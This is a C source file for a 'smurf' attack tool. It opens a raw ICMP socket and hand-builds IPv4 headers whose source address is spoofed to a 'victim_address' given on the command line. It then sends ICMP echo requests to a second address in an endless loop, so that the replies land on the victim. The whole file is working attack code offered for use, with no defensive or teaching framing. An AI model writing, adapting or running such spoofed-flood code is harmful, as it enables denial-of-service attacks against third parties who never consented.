#include "header.h"

#define MESSAGE_SIZE 17
#define TIMEOUT 1500
#define HOSTNAME_LEN 256

int main(int argc, char **argv)
{
	uint32_t victim_address, pseudo_attacker_address;
	SOCKET sock;
	int hdr_included = 1;

#ifdef WIN32
	WSADATA trash;
	if (WSAStartup(0x0202, &trash) == SOCKET_ERROR)
	{
		die("Cannot init winsock", -1);
	}
#endif

	setbuf(stdout, NULL);
	atexit((void(*)(void))cleanup);

	if (argc < 3)
	{
		die("params specified\nUse \"./smurf victim_address pseudo_attacker_address\"", -1);
	}

	if ((victim_address = inet_addr(argv[1])) == INADDR_NONE)
	{
		die("Invalid address supplied", -1);
	}

	if ((pseudo_attacker_address = inet_addr(argv[2])) == INADDR_NONE)
	{
		die("Invalid subnet address supplied", -1);
	}


	//printf("Pinging \"%s\" from [%s].\n\n", argv[1], inet_ntoa(*(struct in_addr*)&addr));//????????????????????

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == SOCKET_ERROR)
	{
		die("Cannot socket()", -2);
	}

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (const char*)&hdr_included, sizeof hdr_included) != 0)
	{
		die("Cannot setsockopt()", -2);
	}
	

	while(1)
	{
		printf("ping from %s\t", inet_ntoa(*(struct in_addr*)&victim_address));
		
		if (smurf(sock, pseudo_attacker_address, victim_address, MESSAGE_SIZE))
		{
			printf("Packet sended\n");
		}
		else
		{
			die("Some error happends", -5);
		}
		
		sleep(500);
	}
	
	close(sock);

	return 0;
}

void die(char *reason, int code)
{
#ifdef WIN32
	DWORD error = GetLastError();
	char *error_description=NULL, *error_description_oem=NULL;
	if (FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&error_description, 0, 0) != 0)
	{
		error_description_oem = (char*)malloc(strlen(error_description)+1);
		CharToOemA(error_description, error_description_oem);
		HeapFree(GetProcessHeap(), 0, error_description);
		fprintf(stderr, "%s, winerr %d: %s\n", reason, error, error_description_oem);
		free(error_description_oem);
	}
	else
	{
		fprintf(stderr, "%s, winerr %d (FormatMessageA fail with winerr %d)", reason, error, GetLastError());
	}
#elif __linux__
	fprintf(stderr, "%s, errno %d\n", reason, errno);
#endif
	exit(code);
}

uint16_t calcOnesComplement(uint8_t *data, uint32_t len)
{
	uint32_t result = 0;
	uint16_t i;

	if (len & 1)
	{
		result = data[len - 1];
		len--;
	}

	for (i = 0; i < len; i += 2)
	{
		result += *(uint16_t*)(data + i);
		if (result & 0xFFFF0000)
		{
			result &= 0xFFFF;
			result++;
		}
	}

	return (uint16_t)((result & 0xFFFF) ^ 0xFFFF);
}

void cleanup()
{
#ifdef WIN32
	WSACleanup();
#endif
}

_Bool smurf(SOCKET sock, uint32_t dest_addr, uint32_t src_addr, uint16_t data_length)
{
	uint8_t *outPacket;
	struct icmphdr *header_icmp;
	struct iphdr *header_ip;
	struct sockaddr_in addr;
	uint32_t i;

	if ((outPacket = (uint8_t*)malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + data_length)) == NULL)
	{
		die("Cannot allocate memory", -1);
	}

	srand((unsigned int)time(NULL));
	for (i = 0; i < data_length + sizeof(struct icmphdr); i++) outPacket[i] = rand() % 0xFF;

	header_ip = (struct iphdr*)outPacket;
	header_icmp = (struct icmphdr*)(outPacket+sizeof(struct iphdr));

	header_icmp->type = ICMP_ECHO;
	header_icmp->code = 0;
	header_icmp->checksum = 0;
	header_icmp->checksum = calcOnesComplement(outPacket + sizeof(struct iphdr), sizeof(struct icmphdr) + data_length);

	header_ip->version = 4;
	header_ip->ihl = 5;
	header_ip->tos = 0;
	header_ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + data_length);
	header_ip->frag_off = 0;
	header_ip->ttl = 255;
	header_ip->protocol = IPPROTO_ICMP;
	header_ip->saddr = src_addr;
	header_ip->daddr = dest_addr;
	header_ip->check = calcOnesComplement(outPacket, sizeof(struct iphdr));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = dest_addr;
	if (sendto(sock, (const char *)outPacket, sizeof(struct iphdr) + sizeof(struct icmphdr) + data_length, 0, (const struct sockaddr*)&addr, sizeof addr) == SOCKET_ERROR)
	{
		die("Cannot sendto()", -3);
	}

	free(outPacket);
	
	return true;
}

uint32_t generate_ip_by_subnet_mask(uint32_t subnet, uint32_t mask, uint32_t prev_ip)
{
	uint32_t prev_digest = ntohl(prev_ip & mask);

	if (prev_digest >= ntohl(mask))
	{
		return subnet;
	}

	return ntohl(prev_digest + 1 + ntohl(subnet));
}
